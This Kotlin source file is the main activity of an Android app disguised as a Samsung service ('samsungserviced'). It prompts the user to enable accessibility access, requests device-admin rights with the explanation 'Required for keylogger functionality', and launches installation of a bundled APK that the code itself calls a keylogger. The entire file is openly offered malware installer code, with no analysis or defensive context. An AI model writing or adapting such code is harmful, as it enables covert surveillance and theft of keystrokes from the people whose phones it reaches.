package com.example.samsungservised

import android.app.admin.DevicePolicyManager
import android.content.ComponentName
import android.content.Intent
import android.net.Uri
import android.os.Bundle
import android.provider.Settings
import android.widget.Button
import android.widget.Toast
import androidx.appcompat.app.AppCompatActivity

class MainActivity : AppCompatActivity() {

    private lateinit var btnEnableAccessibility: Button
    private lateinit var btnEnableAdmin: Button
    private lateinit var btnInstallKeylogger: Button

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_main)

        // Initialize buttons
        btnEnableAccessibility = findViewById(R.id.btnEnableAccessibility)
        btnEnableAdmin = findViewById(R.id.btnEnableAdmin)
        btnInstallKeylogger = findViewById(R.id.btnInstallKeylogger)

        // Set button click listeners
        btnEnableAccessibility.setOnClickListener { enableAccessibility() }
        btnEnableAdmin.setOnClickListener { enableDeviceAdmin() }
        btnInstallKeylogger.setOnClickListener { installKeylogger() }
    }

    private fun enableAccessibility() {
        try {
            val intent = Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS)
            startActivity(intent)
            Toast.makeText(this, "Enable 'samsungserviced' in accessibility settings", Toast.LENGTH_LONG).show()
        } catch (e: Exception) {
            e.printStackTrace()
            Toast.makeText(this, "Error enabling accessibility", Toast.LENGTH_SHORT).show()
        }
    }

    private fun enableDeviceAdmin() {
        val deviceAdmin = ComponentName(this, DeviceAdminReceiver::class.java)
        val intent = Intent(DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN)
        intent.putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN, deviceAdmin)
        intent.putExtra(DevicePolicyManager.EXTRA_ADD_EXPLANATION, "Required for keylogger functionality")
        startActivityForResult(intent, 1000)
    }

    private fun installKeylogger() {
        try {
            val intent = Intent(Intent.ACTION_VIEW)
            intent.setDataAndType(Uri.parse("file:///android_asset/samsungserviced.apk"), "application/vnd.android.package-archive")
            intent.addFlags(Intent.FLAG_GRANT_READ_URI_PERMISSION)
            startActivity(intent)
        } catch (e: Exception) {
            e.printStackTrace()
            Toast.makeText(this, "Error installing keylogger", Toast.LENGTH_SHORT).show()
        }
    }

    override fun onActivityResult(requestCode: Int, resultCode: Int, data: Intent?) {
        super.onActivityResult(requestCode, resultCode, data)
        if (requestCode == 1000) {
            if (resultCode == RESULT_OK) {
                Toast.makeText(this, "Device admin enabled successfully", Toast.LENGTH_SHORT).show()
            } else {
                Toast.makeText(this, "Device admin enabling failed", Toast.LENGTH_SHORT).show()
            }
        }
    }
}
